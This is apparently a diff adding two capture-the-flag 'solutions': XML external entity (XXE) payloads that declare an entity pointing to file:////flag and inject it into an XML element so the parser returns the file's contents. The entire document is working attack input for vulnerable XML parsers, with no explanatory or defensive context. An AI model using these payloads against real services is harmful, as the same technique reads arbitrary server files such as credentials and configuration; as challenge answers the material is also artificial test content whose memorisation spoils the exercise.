@@ -1,0 +1,13 @@
+<!-- solution 1 -->
+<?xml version="1.0" ?>
+<!DOCTYPE  kaibro[
+    <!ENTITY xxe SYSTEM "file:////flag" >]> 
+<details>
+<subnet_mask> &xxe; </subnet_mask>
+<test></test>
+</details>
+
+<!-- solution 2 -->
+<!DOCTYPE  kaibro[
+    <!ENTITY xxe SYSTEM "file:////flag" >]> 
+<abcd>&xxe;</abcd>
